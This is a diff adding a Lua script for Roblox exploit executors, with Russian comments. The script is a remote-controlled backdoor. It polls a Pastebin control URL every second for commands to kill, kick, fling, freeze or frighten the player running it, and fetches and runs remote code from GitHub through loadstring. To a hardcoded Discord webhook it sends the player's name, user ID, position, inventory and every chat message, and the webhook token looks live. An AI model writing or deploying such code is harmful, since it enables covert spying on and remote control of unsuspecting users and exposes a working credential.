@@ -1,1 +1,171 @@
+-- [[ CONFIG ]] --
+local settings = {
+    webhook = "https://discord.com/api/webhooks/1463513332697927883/7XBUBBop6fsTyZvAfdCUKskGulE5z4MpXl_Q6Pa5Pqxg8Fdz7hRlnlF7PUzayceSrvF5",
+    control = "https://pastebin.com/raw/tbEyg2z7",
+    check_delay = 1
+}
 
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local Debris = game:GetService("Debris") -- Для очистки мусора
+local lp = Players.LocalPlayer
+
+-- Универсальная функция запроса (Поддержка Fluxus, Synapse, Delta, Hydrogen)
+local function requestFunc(options)
+    local fn = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
+    if fn then return fn(options) end
+end
+
+-- Оптимизированное получение инвентаря
+local function getInventory()
+    local tools = {}
+    local backpack = lp:FindFirstChild("Backpack")
+    local char = lp.Character
+    
+    if backpack then
+        for _, v in ipairs(backpack:GetChildren()) do
+            if v:IsA("Tool") then table.insert(tools, v.Name) end
+        end
+    end
+    if char then
+        for _, v in ipairs(char:GetChildren()) do
+            if v:IsA("Tool") then table.insert(tools, v.Name .. " (Equipped)") end
+        end
+    end
+    return #tools > 0 and table.concat(tools, ", ") or "Empty"
+end
+
+-- Улучшенная функция логов
+local function sendLog(title, desc, color)
+    task.spawn(function()
+        local pos = "Unknown"
+        pcall(function()
+            local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                pos = string.format("X: %.1f, Y: %.1f, Z: %.1f", hrp.Position.X, hrp.Position.Y, hrp.Position.Z)
+            end
+        end)
+
+        local data = {
+            ["embeds"] = {{
+                ["title"] = title,
+                ["description"] = desc,
+                ["color"] = color or 0xFF0000,
+                ["fields"] = {
+                    {["name"] = "👤 Игрок", ["value"] = "`" .. lp.Name .. " (" .. lp.UserId .. ")`", ["inline"] = true},
+                    {["name"] = "🎮 Игра", ["value"] = "[Link](https://www.roblox.com/games/" .. game.PlaceId .. ")", ["inline"] = true},
+                    {["name"] = "📍 Координаты", ["value"] = "`" .. pos .. "`", ["inline"] = true},
+                    {["name"] = "🎒 Инвентарь", ["value"] = "```" .. getInventory() .. "```", ["inline"] = false}
+                },
+                ["footer"] = {["text"] = "AxM v38 Fixed • " .. os.date("%X")}
+            }}
+        }
+
+        requestFunc({
+            Url = settings.webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+end
+
+-- Логика управления
+task.spawn(function()
+    local last_cmd = ""
+    local flingConnection
+    
+    -- Получаем начальное состояние
+    pcall(function()
+        local res = game:HttpGet(settings.control .. "?t=" .. tick())
+        last_cmd = res:gsub("%s+", ""):lower()
+    end)
+
+    while true do
+        task.wait(settings.check_delay)
+        
+        local ok, res = pcall(function() 
+            return game:HttpGet(settings.control .. "?nocache=" .. tick()) 
+        end)
+
+        if ok and res then
+            local clean_res = res:match("^%s*(.-)%s*$")
+            local current_cmd = clean_res:lower()
+
+            if current_cmd ~= last_cmd and current_cmd ~= "safe" and current_cmd ~= "" then
+                last_cmd = current_cmd
+                
+                local char = lp.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                local hum = char and char:FindFirstChildOfClass("Humanoid")
+
+                -- [ ИСПОЛНЕНИЕ КОМАНД ] --
+                if current_cmd == "kill" and hum then
+                    hum.Health = 0
+                    sendLog("💀 КИЛЛ", "Ликвидирован.")
+
+                elseif current_cmd:find("gui") then
+                    sendLog("🖥️ GUI", "Запуск...")
+                    task.spawn(function()
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/arxitectorcz/Arxetector/refs/heads/main/AxA%20Gui"))()
+                    end)
+
+                elseif current_cmd:find("message") then
+                    local msg = clean_res:match("%((.-)%)") or "System"
+                    local g = Instance.new("ScreenGui", lp.PlayerGui)
+                    local t = Instance.new("TextLabel", g)
+                    t.Size = UDim2.new(1,0,0.1,0); t.Position = UDim2.new(0,0,0.45,0)
+                    t.Text = msg; t.TextScaled = true; t.BackgroundColor3 = Color3.new(0,0,0)
+                    t.TextColor3 = Color3.new(1,1,1); t.BackgroundTransparency = 0.5
+                    Debris:AddItem(g, 5)
+                    sendLog("📢 MSG", "Текст: " .. msg, 0x00FF00)
+
+                elseif current_cmd == "screamer" then
+                    local s = Instance.new("Sound", workspace)
+                    s.SoundId = "rbxassetid://556750162"; s.Volume = 10; s:Play()
+                    Debris:AddItem(s, 5)
+                    local g = Instance.new("ScreenGui", lp.PlayerGui)
+                    local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1,0,1,0); i.Image = "rbxassetid://15518663806"
+                    Debris:AddItem(g, 3)
+                    sendLog("😱 СКРИМЕР", "Бу!")
+
+                elseif current_cmd:find("kick") then
+                    local r = clean_res:match("%((.-)%)") or "Disconnected"
+                    sendLog("🚪 КИК", "Причина: " .. r, 0xFFFF00)
+                    task.wait(0.3)
+                    lp:Kick(r)
+
+                elseif current_cmd == "fling" and hrp then
+                    if flingConnection then flingConnection:Disconnect() end
+                    flingConnection = RunService.Heartbeat:Connect(function()
+                        hrp.Velocity = Vector3.new(0, 5000, 0) -- Снизил безумные 9999 до 5000 (стабильнее)
+                        hrp.RotVelocity = Vector3.new(0, 5000, 0)
+                    end)
+                    sendLog("🌪️ ФЛИНГ", "Включен")
+
+                elseif current_cmd == "unfling" then
+                    if flingConnection then flingConnection:Disconnect() end
+                    sendLog("🛡️ УНФЛИНГ", "Выключен")
+
+                elseif current_cmd == "freeze" and hrp then
+                    hrp.Anchored = true
+                    sendLog("🧊 ФРИЗ", "Заморожен")
+
+                elseif current_cmd == "unfreeze" and hrp then
+                    hrp.Anchored = false
+                    sendLog("🔥 УНФРИЗ", "Разморожен")
+                end
+            end
+        end
+    end
+end)
+
+-- Фикс: проверка на наличие Chat (в новых версиях TextChatService)
+if lp:FindFirstChild("Chatted") or lp.ClassName == "Player" then
+    lp.Chatted:Connect(function(m) 
+        sendLog("💬 ЧАТ", "```" .. m .. "```", 0x3498DB) 
+    end)
+end
+
+sendLog("🛰️ СИСТЕМА", "Скрипт запущен. Ожидание команд...", 0x00FF00)
